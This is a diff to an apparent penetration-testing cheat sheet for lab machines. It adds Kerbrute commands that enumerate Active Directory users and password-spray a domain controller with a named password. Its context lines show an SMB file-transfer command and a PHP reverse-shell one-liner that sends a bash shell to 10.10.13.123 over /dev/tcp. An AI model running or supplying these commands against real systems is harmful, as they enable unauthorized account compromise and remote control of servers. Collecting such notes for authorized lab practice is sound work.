@@ -196,6 +196,10 @@ File Transfer
       - files is a name that should be the same as the current directory
       - example: xcopy \\10.10.10.14\files\filename.exe
 
+Kerbrute
+  Enum Users: /opt/tools/kerbrute/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield -o kerbrute.userenum.out dom_users.txt
+  Password Spray: /opt/tools/kerbrute/kerbrute_linux_amd64 passwordspray --dc 10.10.10.192 -d blackfield dom_users.txt '#00^BlackKnight'
+
 Revrse Shell
   Link: https://blog.barradell-johns.com/index.php/2018/12/30/reverse-shell-cheat-sheet/
     <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.123/5678 0>&1'");phpinfo();?>
